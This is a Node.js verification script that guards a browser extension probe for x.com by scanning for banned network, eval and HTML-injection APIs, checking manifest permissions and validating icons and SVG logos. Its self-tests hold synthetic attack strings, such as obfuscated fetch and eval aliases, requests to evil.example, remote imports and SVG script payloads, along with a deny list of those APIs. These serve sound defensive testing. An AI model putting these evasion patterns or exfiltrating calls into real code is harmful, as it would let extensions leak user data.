#!/usr/bin/env node
// xsched gate 0 — the guard: prove the probe never phones home and never asks for power.
//
// It (1) scans every file under probe/ for banned network / DOM-injection / eval APIs and
// (2) checks probe/manifest.json for a minimal, honest permission surface. This script may
// only ever get *stricter*; loosening a rule here is a hard-rule violation.
//
// `npm run verify` → exit 0 when clean, exit 1 (with reasons) otherwise.
// A self-test proves the scanner actually catches a violation on a synthetic probe.

import { mkdtempSync, mkdirSync, readdirSync, readFileSync, rmSync, lstatSync, writeFileSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, relative } from "node:path";
import { fileURLToPath } from "node:url";
import { inflateSync } from "node:zlib";
import { DOMParser } from "linkedom";

const ROOT = join(dirname(fileURLToPath(import.meta.url)), "..");
const PROBE = join(ROOT, "probe");
const DOCS = join(ROOT, "docs");

// Load the probe's two pure modules (classic scripts → globalThis) so the guard can prove,
// on a hostile synthetic page, that no page content can reach the skeleton or the samples.
let READER;
let SKELETON;
const ICON_SIZES = new Set(["16", "32", "48", "128"]);
const PNG_SIGNATURE = Buffer.from("89504e470d0a1a0a", "hex");

function crc32(bytes) {
  let crc = 0xffffffff;
  for (const byte of bytes) {
    crc ^= byte;
    for (let bit = 0; bit < 8; bit++) crc = (crc >>> 1) ^ ((crc & 1) ? 0xedb88320 : 0);
  }
  return (crc ^ 0xffffffff) >>> 0;
}

// Validate the complete PNG container, CRCs, and decompressed scanline layout;
// checking only the IHDR magic would accept a fake or truncated image.
export function checkPng(bytes, size, label = "icon") {
  const errors = [];
  try {
    if (!bytes.subarray(0, 8).equals(PNG_SIGNATURE)) throw new Error("not a PNG");
    let offset = 8;
    let header;
    let ended = false;
    let palette = false;
    const data = [];
    let dataEnded = false;
    while (offset < bytes.length) {
      if (offset + 12 > bytes.length) throw new Error("truncated PNG chunk");
      const length = bytes.readUInt32BE(offset);
      const end = offset + 12 + length;
      if (end > bytes.length) throw new Error("truncated PNG chunk data");
      const type = bytes.toString("ascii", offset + 4, offset + 8);
      if (!/^[A-Za-z]{4}$/.test(type)) throw new Error("invalid PNG chunk type");
      if (crc32(bytes.subarray(offset + 4, end - 4)) !== bytes.readUInt32BE(end - 4)) throw new Error("invalid PNG CRC");
      const chunk = bytes.subarray(offset + 8, end - 4);
      if (!header && type !== "IHDR") throw new Error("PNG must start with IHDR");
      if (type === "IHDR") {
        if (header || length !== 13) throw new Error("invalid PNG IHDR");
        header = chunk;
      } else if (type === "PLTE") {
        if (palette || data.length || !length || length % 3 || length > 768) throw new Error("invalid PNG palette");
        palette = true;
      } else if (type === "IDAT") {
        if (dataEnded) throw new Error("nonconsecutive PNG IDAT chunks");
        data.push(chunk);
      } else if (type === "IEND") {
        if (length || !data.length || end !== bytes.length) throw new Error("invalid PNG IEND/trailing bytes");
        ended = true;
      } else if (type[0] === type[0].toUpperCase()) {
        throw new Error("unknown critical PNG chunk");
      }
      if (data.length && type !== "IDAT") dataEnded = true;
      offset = end;
    }
    if (!header || !ended) throw new Error("incomplete PNG");
    const width = header.readUInt32BE(0);
    const height = header.readUInt32BE(4);
    if (width !== Number(size) || height !== Number(size)) throw new Error(`PNG dimensions ${width}x${height} must be ${size}x${size}`);
    const depth = header[8];
    const color = header[9];
    const depths = { 0: [1, 2, 4, 8, 16], 2: [8, 16], 3: [1, 2, 4, 8], 4: [8, 16], 6: [8, 16] };
    if (!depths[color]?.includes(depth) || header[10] !== 0 || header[11] !== 0 || header[12] > 1 || (color === 3 && !palette)) throw new Error("invalid PNG encoding");
    const channels = { 0: 1, 2: 3, 3: 1, 4: 2, 6: 4 }[color];
    const passes = header[12] === 0 ? [[0, 0, 1, 1]] : [[0, 0, 8, 8], [4, 0, 8, 8], [0, 4, 4, 8], [2, 0, 4, 4], [0, 2, 2, 4], [1, 0, 2, 2], [0, 1, 1, 2]];
    const rows = [];
    for (const [x, y, dx, dy] of passes) {
      const columns = Math.max(0, Math.ceil((width - x) / dx));
      const count = Math.max(0, Math.ceil((height - y) / dy));
      if (columns) for (let row = 0; row < count; row++) rows.push(1 + Math.ceil(columns * channels * depth / 8));
    }
    const expected = rows.reduce((sum, row) => sum + row, 0);
    const pixels = inflateSync(Buffer.concat(data), { maxOutputLength: expected });
    if (pixels.length !== expected) throw new Error("invalid PNG pixel data length");
    let position = 0;
    for (const row of rows) {
      if (pixels[position] > 4) throw new Error("invalid PNG scanline filter");
      position += row;
    }
  } catch (error) { errors.push(`${label}: ${error.message}`); }
  return errors;
}

export function checkIconMap(icons, label = "icons", dir = PROBE) {
  if (!icons || typeof icons !== "object" || Array.isArray(icons) || !Object.keys(icons).length) return [`${label}: must be a nonempty icon size object`];
  const errors = [];
  for (const [size, path] of Object.entries(icons)) {
    if (!ICON_SIZES.has(size)) { errors.push(`${label}: unsupported icon size ${size}`); continue; }
    // This grammar also excludes schemes, absolute paths, .., percent encoding,
    // backslashes, extra directories, query strings, and fragments.
    if (typeof path !== "string" || !/^icons\/[A-Za-z0-9_-]+\.png$/.test(path)) {
      errors.push(`${label}.${size}: icon path must be icons/*.png inside probe`);
      continue;
    }
    try {
      const folder = lstatSync(join(dir, "icons"));
      const file = lstatSync(join(dir, path));
      if (folder.isSymbolicLink() || !folder.isDirectory() || file.isSymbolicLink() || !file.isFile()) throw new Error("icon must be a regular file in a real icons directory");
      errors.push(...checkPng(readFileSync(join(dir, path)), size, `${label}.${size}`));
    } catch (error) { errors.push(`${label}.${size}: icon file missing or unsafe (${error.message})`); }
  }
  return errors;
}

// A deliberately small vocabulary for these authored, purely geometric logos.
// No CSS/style, animation, embedded HTML, entities, or executable SVG is needed.
export function checkLogoSvg(source, label = "logo") {
  const errors = [];
  if (/<\s*![\s]*(?:DOCTYPE|ENTITY)\b|<\?/i.test(source)) return [`${label}: SVG declarations/processing instructions forbidden`];
  const document = new DOMParser().parseFromString(source, "image/svg+xml");
  const root = document.documentElement;
  if (!root || root.tagName !== "svg" || root.getAttribute("xmlns") !== "http://www.w3.org/2000/svg" || [...document.childNodes].some((node) => node.nodeType === 1 && node !== root)) return [`${label}: must be a single SVG root`];
  const tags = new Set(["svg", "title", "defs", "clipPath", "g", "path", "rect"]);
  const attributes = new Set(["xmlns", "xmlns:xlink", "viewBox", "id", "x", "y", "width", "height", "rx", "ry", "d", "fill", "stroke", "stroke-width", "stroke-linecap", "stroke-linejoin", "stroke-miterlimit", "clip-path", "transform", "href", "xlink:href"]);
  const elements = [root, ...root.querySelectorAll("*")];
  const ids = new Set(elements.map((element) => element.getAttribute("id")).filter(Boolean));
  for (const element of elements) {
    if (!tags.has(element.tagName)) errors.push(`${label}: forbidden SVG element ${element.tagName}`);
    for (const { name, value } of element.attributes) {
      if (/^on/i.test(name) || !attributes.has(name)) { errors.push(`${label}: forbidden SVG attribute ${name}`); continue; }
      if (name === "xmlns" || name === "xmlns:xlink") {
        const expected = name === "xmlns" ? "http://www.w3.org/2000/svg" : "http://www.w3.org/1999/xlink";
        if (value !== expected) errors.push(`${label}: unexpected namespace`);
        continue;
      }
      if (value.includes("\\")) { errors.push(`${label}: SVG escape sequences forbidden`); continue; }
      if (name === "href" || name === "xlink:href") {
        if (!/^#[A-Za-z_][\w.-]*$/.test(value) || !ids.has(value.slice(1))) errors.push(`${label}: external or unresolved SVG href`);
      } else if (/url\s*\(/i.test(value)) {
        const local = /^url\(\s*(["']?)#([A-Za-z_][\w.-]*)\1\s*\)$/.exec(value);
        if (!local || !ids.has(local[2])) errors.push(`${label}: external or unresolved SVG url reference`);
      } else if (/[a-z][\w+.-]*:|\/\//i.test(value)) errors.push(`${label}: external SVG reference`);
    }
  }
  return errors;
}

export function checkLogoDir(dir = DOCS) {
  const names = readdirSync(dir).filter((name) => /^xsched-logo-B.*\.svg$/.test(name));
  const required = ["xsched-logo-B.svg", "xsched-logo-B-black-on-light.svg", "xsched-logo-B-white-on-dark.svg", "xsched-logo-B-accent-icon.svg"];
  const errors = required.filter((name) => !names.includes(name)).map((name) => `docs/${name}: missing logo`);
  for (const name of names) {
    const file = join(dir, name);
    if (lstatSync(file).isSymbolicLink() || !lstatSync(file).isFile()) errors.push(`docs/${name}: logo must be a regular file`);
    else errors.push(...checkLogoSvg(readFileSync(file, "utf8"), `docs/${name}`));
  }
  return { errors, scanned: names.length };
}

// Things the probe must never contain. (Whole probe/ tree, any file type.)
const BANNED = [
  { name: "namespaced resource attribute", re: /\.\s*setAttributeNS\s*\(\s*(?:null|["'`][^"'`]*["'`])\s*,\s*["'`](?:src|href|srcset|action|poster|data|ping|formaction)["'`]/i },
  { name: "markup parsing", re: /\b(?:createContextualFragment|parseFromString)\b/ },
  { name: "fetch(", re: /\bfetch\s*\(/ },
  { name: "XMLHttpRequest", re: /XMLHttpRequest/ },
  { name: "WebSocket", re: /\bWebSocket\b/ },
  { name: "sendBeacon", re: /sendBeacon/ },
  { name: "EventSource", re: /\bEventSource\b/ },
  { name: "innerHTML", re: /innerHTML/ },
  { name: "outerHTML=", re: /outerHTML\s*=/ },
  { name: "insertAdjacentHTML", re: /insertAdjacentHTML/ },
  { name: "document.write", re: /document\s*\.\s*write/ },
  { name: "eval(", re: /\beval\s*\(/ },
  { name: "new Function", re: /new\s+Function/ },
  { name: "importScripts", re: /importScripts/ },
  { name: "chrome.debugger", re: /chrome\s*\.\s*debugger/ },
  { name: "webRequest", re: /webRequest/ },
  { name: "fetch name/alias", re: /\bfetch\b/ },
  { name: "outerHTML", re: /outerHTML/ },
  { name: "eval name/alias", re: /\beval\b/ },
  { name: "Function constructor/alias", re: /\bFunction\b/ },
  { name: "history patch/navigation", re: /\b(?:pushState|replaceState)\b/ },
  { name: "persistent storage", re: /\b(?:localStorage|sessionStorage|indexedDB)\b|\bchrome\s*\.\s*storage\b/ },
  { name: "programmatic click/scroll", re: /\.\s*(?:click|scroll|scrollBy|scrollTo|scrollIntoView)\s*\(|\.\s*(?:scrollTop|scrollLeft)\s*=/ },
  { name: "resource URL/sink", re: /\b(?:src|href|srcset)\s*=|\burl\s*\(/i },
  { name: "resource attribute", re: /\.\s*setAttribute\s*\(\s*["'`](?:src|href|srcset|action|poster|data|ping|formaction)["'`]/i },
  { name: "CSS import", re: /@import\b/i },
  { name: "network-capable constructors/workers", re: /\b(?:Image|Audio|Worker|SharedWorker|RTCPeerConnection|WebTransport)\b|\bserviceWorker\b/ },
  { name: "remote import", re: /\bimport\s*\(\s*["'`]\s*(?:https?:|\/\/)/ },
];

// Conservative extra view, never a replacement for scanning the original source.
// Decode escaped identifiers/strings, remove comments, fold literal concatenation,
// then normalize constant bracket properties. This is a guard, not a JS sandbox.
function canonicalSource(source) {
  // Preserve quoted literals: the // in an earlier URL must not hide later code.
  let text = source.replace(/("(?:\\.|[^"\\])*"|'(?:\\.|[^'\\])*'|`(?:\\.|[^`\\])*`)|(\/\*[\s\S]*?\*\/|\/\/[^\n\r]*)/g,
    (match, literal) => literal || " ");
  text = text.replace(/\\u\{([0-9a-f]{1,6})\}|\\u([0-9a-f]{4})|\\x([0-9a-f]{2})/gi,
    (match, wide, unicode, hex) => {
      const code = parseInt(wide || unicode || hex, 16);
      return code <= 0x10ffff ? String.fromCodePoint(code) : match;
    });
  const concat = /(["'`])([^"'`\\\n]*)\1\s*\+\s*(["'`])([^"'`\\\n]*)\3/g;
  for (let previous; previous !== text;) {
    previous = text;
    text = text.replace(concat, (_, a, left, b, right) => `"${left}${right}"`);
  }
  return text.replace(/\[\s*(["'`])([\w$]+)\1\s*\]/g, ".$2");
}

// content_scripts may only touch X itself over https.
const ALLOWED_MATCHES = new Set([
  "https://x.com/*",
  "https://twitter.com/*",
  "https://www.x.com/*",
  "https://www.twitter.com/*",
]);

function listFiles(dir, base = dir) {
  const out = [];
  for (const name of readdirSync(dir)) {
    const full = join(dir, name);
    if (lstatSync(full).isSymbolicLink()) throw new Error(`symlink forbidden in probe: ${full}`);
    if (lstatSync(full).isDirectory()) out.push(...listFiles(full, base));
    else out.push(full);
  }
  return out;
}

export function scanSource(text, label) {
  const errors = [];
  const canonical = canonicalSource(text);
  for (const rule of BANNED) {
    if (rule.re.test(text) || rule.re.test(canonical)) errors.push(`${label}: contains banned API "${rule.name}"`);
  }
  if (/\bimport\s*\(/.test(canonical)) errors.push(`${label}: dynamic import forbidden`);
  return errors;
}

export function checkManifest(manifest, label = "probe/manifest.json", dir = PROBE) {
  const errors = [];
  if (manifest.manifest_version !== 3) errors.push(`${label}: manifest_version must be 3`);
  const keys = new Set(["manifest_version", "name", "version", "description", "content_scripts", "icons", "action"]);
  for (const key of Object.keys(manifest)) {
    if (!keys.has(key)) errors.push(`${label}: unexpected manifest field "${key}"`);
  }
  if (Object.hasOwn(manifest, "icons")) errors.push(...checkIconMap(manifest.icons, `${label}.icons`, dir));
  if (Object.hasOwn(manifest, "action")) {
    const action = manifest.action;
    if (!action || typeof action !== "object" || Array.isArray(action) || !Object.hasOwn(action, "default_icon")) errors.push(`${label}: action must contain only default_icon`);
    else {
      for (const key of Object.keys(action)) if (key !== "default_icon") errors.push(`${label}: unexpected action field ${key}`);
      errors.push(...checkIconMap(action.default_icon, `${label}.action.default_icon`, dir));
    }
  }

  if (Array.isArray(manifest.permissions) && manifest.permissions.length > 0) {
    errors.push(`${label}: permissions must be empty/absent, found ${JSON.stringify(manifest.permissions)}`);
  }
  if (manifest.permissions !== undefined && !Array.isArray(manifest.permissions)) {
    errors.push(`${label}: permissions must be an array when present`);
  }
  for (const key of ["host_permissions", "optional_host_permissions", "optional_permissions", "web_accessible_resources", "externally_connectable", "sandbox", "declarative_net_request"]) {
    if (manifest[key] !== undefined) errors.push(`${label}: "${key}" is not allowed`);
  }
  if (manifest.content_security_policy !== undefined) {
    errors.push(`${label}: content_security_policy override is not allowed`);
  }

  const entries = manifest.content_scripts;
  if (!Array.isArray(entries) || entries.length === 0) {
    errors.push(`${label}: content_scripts must be a non-empty array`);
  } else {
    for (const entry of entries) {
      if (!entry || typeof entry !== "object") { errors.push(`${label}: malformed content_scripts entry`); continue; }
      if (entry.world !== undefined && entry.world !== "ISOLATED") {
        errors.push(`${label}: content_scripts world must be ISOLATED (found ${entry.world})`);
      }
      for (const key of Object.keys(entry)) {
        if (!["matches", "js", "run_at", "world"].includes(key)) errors.push(`${label}: unexpected content_scripts field "${key}"`);
      }
      const matches = Array.isArray(entry.matches) ? entry.matches : [];
      if (matches.length === 0) errors.push(`${label}: content_scripts.matches must not be empty`);
      for (const pattern of matches) {
        if (!ALLOWED_MATCHES.has(pattern)) {
          errors.push(`${label}: content_scripts.matches "${pattern}" is not x.com/twitter.com`);
        }
      }
      if (!Array.isArray(entry.js) || !entry.js.length || entry.js.some((path) => typeof path !== "string" || !/^[\w-]+\.js$/.test(path))) {
        errors.push(`${label}: js must name local probe scripts`);
      }
    }
  }
  return errors;
}

// Check a whole probe directory (default: the real one).
export function checkProbeDir(dir) {
  const errors = [];
  if (!existsSync(join(dir, "manifest.json"))) errors.push("probe/manifest.json: missing manifest");
  const files = listFiles(dir);
  let scanned = 0;
  for (const file of files) {
    const rel = relative(ROOT, file);
    const text = readFileSync(file, "utf8");
    scanned += 1;
    errors.push(...scanSource(text, rel));
    if (file.endsWith("manifest.json") || /[\\/]manifest\.json$/.test(file)) {
      let manifest;
      try {
        manifest = JSON.parse(text);
      } catch (err) {
        errors.push(`${rel}: not valid JSON (${err.message})`);
        continue;
      }
      errors.push(...checkManifest(manifest, rel, dir));
      for (const entry of manifest.content_scripts || []) {
        for (const script of Array.isArray(entry?.js) ? entry.js : []) {
          if (!existsSync(join(dir, script))) errors.push(`${rel}: missing script ${script}`);
        }
      }
    }
  }
  return { errors, scanned };
}

// Structural vocabulary a skeleton legitimately prints (tags, kept attribute names, the
// header/trailer words). A secret fragment that coincides with one of these is not a leak.
const LEAK_VOCAB = [
  "role", "data-testid", "aria-selected", "aria-hidden", "aria-expanded", "aria-checked",
  "aria-current", "aria-modal", "aria-live", "dir", "type", "tabindex", "data-focusable",
  "class", "id", "href", "src", "title", "alt", "placeholder", "aria-label", "aria-description",
  "aria-valuetext", "data-renderkey", "input", "c", "x", "#text", "#shadow",
  "#iframe", "origin", "xsched-skeleton", "path", "scheduled", "other", "nodes", "TRUNCATED",
  "depth", "div", "span", "body", "html", "section", "article", "main", "aside", "header",
  "footer", "ul", "li", "p", "a", "hr", "br", "img", "svg", "path", "use",
].join(" ");
const LEAK_ALLOWED = new Set();
for (let i = 0; i + 4 <= LEAK_VOCAB.length; i += 1) LEAK_ALLOWED.add(LEAK_VOCAB.slice(i, i + 4));

const CJK_RUN = /[\u3040-\u30ff\u3400-\u4dbf\u4e00-\u9fff\uac00-\ud7af]/;

// Every >=4-char printable-ASCII substring plus every >=2-char CJK run of a secret; a leak
// shows up as any one of these appearing in the output.
function secretFragments(needle) {
  const fragments = new Set();
  for (let i = 0; i < needle.length; i += 1) {
    const four = needle.slice(i, i + 4);
    if (four.length === 4 && /^[\x20-\x7e]+$/.test(four)) fragments.add(four);
    const two = needle.slice(i, i + 2);
    if (two.length === 2 && CJK_RUN.test(two[0]) && CJK_RUN.test(two[1])) fragments.add(two);
  }
  return fragments;
}

// A hostile synthetic page whose every content-bearing slot carries a secret: URL, uuid,
// email, @handle, English/CJK prose, prose aria-label/title/alt/placeholder, a long hash
// class, and a long data-* value. Nothing of it may survive into the skeleton, and the
// masked samples may not keep a single readable character.
export function attackSelfTest(reader = READER, mapper = SKELETON) {
  const secrets = [
    "https://example.com/a?b=c",
    "550e8400-e29b-41d4-a716-446655440000",
    "punkcan@example.com",
    "VibeEyeX",
    "Will send on Oct 10, 2026 at 9:00 AM",
    "明天下午四點準時發送敬請期待",
    "2026年7月20日(月)の午後4:24に送信されます",
    "sentence with words in a label",
    "private title of the post",
    "alt text describing the picture",
    "placeholder asks what is happening",
    "deadbeefdeadbeefcafe1234",
  ];
  const page = `<!DOCTYPE html><html lang="en"><body>`
    + `<section role="dialog" aria-modal="true">`
    + `<div role="tablist"><div role="tab" aria-selected="true" data-testid="cellInnerDiv">Scheduled</div></div>`
    + `<div class="r-9k2f7b1c8d4e6a3f5b0c css-long-hash-abcdef keep-me" data-renderkey="deadbeefdeadbeefcafe1234"`
    + ` id="550e8400-e29b-41d4-a716-446655440000" aria-label="sentence with words in a label"`
    + ` title="private title of the post">`
    + `<a href="https://example.com/a?b=c">https://example.com/a?b=c</a>`
    + `<img src="https://example.com/a?b=c" alt="alt text describing the picture">`
    + `<input placeholder="placeholder asks what is happening">`
    + `<aside class="VibeEyeX-profile" role="VibeEyeX" data-testid="VibeEyeX" aria-hidden="VibeEyeX"></aside>`
    + `<p>Will send on Oct 10, 2026 at 9:00 AM punkcan@example.com @VibeEyeX</p>`
    + `<p>明天下午四點準時發送敬請期待</p>`
    + `<p>2026年7月20日(月)の午後4:24に送信されます</p>`
    + `</div></section></body></html>`;
  const document = new DOMParser().parseFromString(page, "text/html");
  const skeleton = mapper.buildSkeleton(document, { pathname: "/home/compose/post/unsent/scheduled" });
  if (skeleton.includes("example")) throw new Error("self-test: skeleton leaked a URL host");
  if (!/^[\x20-\x7e\n]*$/.test(skeleton)) throw new Error("self-test: skeleton contains non-ASCII page content");
  for (const secret of secrets) {
    if (skeleton.includes(secret)) throw new Error(`self-test: skeleton leaked "${secret}"`);
    for (const fragment of secretFragments(secret)) {
      if (LEAK_ALLOWED.has(fragment)) continue;
      if (skeleton.includes(fragment)) throw new Error(`self-test: skeleton leaked fragment "${fragment}" of "${secret}"`);
    }
  }
  // The masked sample path: letters/marks/symbols become "x"; only digits, punctuation,
  // and spaces may survive, and at most 60 code points.
  let maskedCount = 0;
  for (const secret of secrets) {
    const masked = reader.maskSample(secret);
    if (!masked.includes("x")) throw new Error(`self-test: maskSample left "${secret}" unmasked`);
    if (!/^(?:x|[\p{Nd}\p{P}\s])+$/u.test(masked)) throw new Error(`self-test: maskSample kept content from "${secret}": ${masked}`);
    if (Array.from(masked).length > 60) throw new Error("self-test: maskSample exceeded 60 code points");
    maskedCount += 1;
  }
  const hostile = new DOMParser().parseFromString('<html><body><section role="dialog"><button><span>Will send on 2027-04-05 18:30 UTC</span><div data-testid="tweetText"><span>Will send on 2027-04-05 18:30 UTC private 987654321</span></div><p>private purchase 2027 1122334455</p></button></section></body></html>', 'text/html');
  const report = reader.readSnapshot(hostile, { pathname: '/compose/post/unsent/scheduled' });
  const diag = reader.buildDiagnostic({ ...report, lang: 'VibeEyeX', doclang: 'en-x-VibeEyeX' });
  if (!/lang=x doclang=x/.test(diag)) throw new Error('self-test: diagnostic leaked unregistered language tags');
  for (const leak of ['VibeEyeX', '987654321', '1122334455', 'Will send', 'private']) {
    if (diag.includes(leak)) throw new Error('self-test: diagnostic leaked content or sampled tweet body');
  }
  if (report.samples.length !== 1) throw new Error('self-test: time samples must come only from the isolated time label');
  const origin = mapper.hostnameOf('https://privateuser:secret@frame.example:8080/path?q=token');
  if (origin !== 'frame.example') throw new Error('self-test: iframe origin includes credentials/path/port');
  return { secrets: secrets.length + 3, fragments: maskedCount };
}

function selfTest() {
  const violations = [
    'a.setAttributeNS(null, "href", "https://evil.example/")',
    'range.createContextualFragment("<img>")', 'parser.parseFromString("<img>", "text/html")',
    "fetch/*comment*/('x')", "globalThis.fetch", 'window["fe"+"tch"]("x")',
    'navigator["sendBeacon"]("x")', 'window["XML" + "HttpRequest"]',
    'window["Web" + "Socket"]', 'globalThis["Event" + "Source"]',
    'window["\\u0066etch"]("x")', 'window.f\\u0065tch("x")',
    'document/*comment*/["write"]("x")', 'el["outer"+"HTML"]="x"',
    'window["ev"+"al"]("x")', 'new/*comment*/Function("x")',
    'import("https://evil.example/m.js")', 'import("./m.js")',
    'history["push"+"State"]({}, "", "/home")', 'chrome["storage"].local.set({})',
    'element["click"]()', 'element.scrollTop=10', 'img.src="https://evil.example/"',
    'img.setAttribute("src", "https://evil.example/a.png")', 'new Image()', '@import "https://evil.example/a.css";',
    'const url="https://evil.example/"; window["fe"+"tch"](url)',
  ];
  for (const source of violations) {
    if (!scanSource(source, "self-test").length) throw new Error(`self-test: missed ${source}`);
  }
  // Prove the scanner fails closed: a synthetic probe with a network call AND a bad
  // manifest must produce errors, while a clean synthetic probe must not.
  const dir = mkdtempSync(join(tmpdir(), "xsched-verify-selftest-"));
  try {
    const bad = join(dir, "bad");
    mkdirSync(bad);
    writeFileSync(join(bad, "evil.js"), "const r = fetch('https://evil.example/x');\n");
    writeFileSync(join(bad, "manifest.json"), JSON.stringify({
      manifest_version: 3,
      permissions: ["tabs"],
      host_permissions: ["<all_urls>"],
      content_scripts: [{ matches: ["<all_urls>"], js: ["evil.js"] }],
    }));
    const badResult = checkProbeDir(bad);
    if (badResult.errors.length === 0) {
      throw new Error("self-test: scanner did NOT flag a probe that calls fetch() with host_permissions");
    }
    const joined = badResult.errors.join("\n");
    if (!joined.includes("fetch(")) throw new Error("self-test: did not flag fetch(");
    if (!joined.includes("host_permissions")) throw new Error("self-test: did not flag host_permissions");
    if (!joined.includes("permissions")) throw new Error("self-test: did not flag permissions");

    const good = join(dir, "good");
    mkdirSync(good);
    writeFileSync(join(good, "ok.js"), "const el = document.createElement('div'); el.textContent = 'ok';\n");
    writeFileSync(join(good, "manifest.json"), JSON.stringify({
      manifest_version: 3,
      content_scripts: [{ matches: ["https://x.com/*"], js: ["ok.js"] }],
    }));
    const goodResult = checkProbeDir(good);
    if (goodResult.errors.length !== 0) {
      throw new Error(`self-test: scanner flagged a clean probe: ${goodResult.errors.join("; ")}`);
    }
    mkdirSync(join(good, "icons"));
    writeFileSync(join(good, "icons", "icon16.png"), readFileSync(join(PROBE, "icons", "icon16.png")));
    writeFileSync(join(good, "icons", "fake.png"), "not a PNG");
    const iconCases = [
      null, [], "icons/icon16.png", {}, { 64: "icons/icon16.png" },
      { 16: "../icon16.png" }, { 16: "icons/../icon16.png" }, { 16: "/icons/icon16.png" },
      { 16: "https://evil.example/icon16.png" }, { 16: "data:image/png;base64,x" },
      { 16: "icons\\icon16.png" }, { 16: "icons/missing.png" }, { 16: "icons/fake.png" },
      { 32: "icons/icon16.png" },
    ];
    for (const icons of iconCases) {
      if (!checkIconMap(icons, "self-test icons", good).length) throw new Error(`self-test: missed invalid icons ${JSON.stringify(icons)}`);
    }
    if (checkIconMap({ 16: "icons/icon16.png" }, "self-test icons", good).length) throw new Error("self-test: rejected valid local PNG icon");
    const cleanManifest = JSON.parse(readFileSync(join(good, "manifest.json"), "utf8"));
    if (checkManifest({ ...cleanManifest, action: { default_icon: { 16: "icons/icon16.png" } } }, "self-test action", good).length) throw new Error("self-test: rejected icon-only action");
    if (!checkManifest({ ...cleanManifest, action: { default_icon: { 16: "icons/icon16.png" }, default_popup: "popup.html" } }, "self-test action", good).length) throw new Error("self-test: allowed extra action field");
    const svg = (body) => `<svg xmlns="http://www.w3.org/2000/svg">${body}</svg>`;
    const svgCases = [
      svg("<script/>"), svg('<rect onclick="alert(1)"/>'), svg("<foreignObject/>"),
      svg('<path href="https://evil.example/"/>'), svg('<path fill="url(//evil.example/a.svg)"/>'),
      svg('<path href="&#104;ttps://evil.example/"/>'),
      svg('<path fill="u\\72l(\\68ttps://evil.example/a.svg)"/>'),
      '<!DOCTYPE svg SYSTEM "https://evil.example/a.dtd">' + svg(""),
      '<?xml-stylesheet href="https://evil.example/a.css"?>' + svg(""),
    ];
    for (const source of svgCases) if (!checkLogoSvg(source, "self-test SVG").length) throw new Error("self-test: missed unsafe SVG");
    if (checkLogoSvg(svg('<defs><clipPath id="local"><rect width="1" height="1"/></clipPath></defs><g clip-path="url(#local)"><path d="M0 0"/></g>')).length) throw new Error("self-test: rejected internal SVG clipPath");
    const attack = attackSelfTest();
    return { source: violations.length, icons: iconCases.length, svg: svgCases.length, attack: attack.secrets };
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}

function main() {
  const problems = [];
  let selfTests;
  try {
    selfTests = selfTest();
  } catch (err) {
    problems.push(`SELF-TEST FAILED: ${err.message}`);
  }

  const { errors, scanned } = checkProbeDir(PROBE);
  problems.push(...errors);
  // Optional synthetic directory is checked in addition to the real probe. It must
  // never provide a way to skip the production guard.
  if (process.argv[2]) problems.push(...checkProbeDir(process.argv[2]).errors);
  const logos = checkLogoDir();
  problems.push(...logos.errors);

  if (problems.length) {
    console.error("verify: FAILED");
    for (const problem of problems) console.error("  ✖ " + problem);
    process.exit(1);
  }
  console.log(`verify: OK — ${scanned} files under probe/ and ${logos.scanned} Logo B SVGs scanned; ${selfTests.source} API bypass, ${selfTests.icons} icon, ${selfTests.svg} SVG, ${selfTests.attack} leak self-tests; no banned APIs, minimal permissions.`);
}

// Run static checks before executing even the two pure modules. A prohibited call
// introduced at module scope must be rejected without ever running it.
if (checkProbeDir(PROBE).errors.length === 0) {
  await import(join(PROBE, "reader.js"));
  await import(join(PROBE, "skeleton.js"));
  READER = globalThis.XSCHED_READER;
  SKELETON = globalThis.XSCHED_SKELETON;
}
if (import.meta.url === `file://${process.argv[1]}`) main();
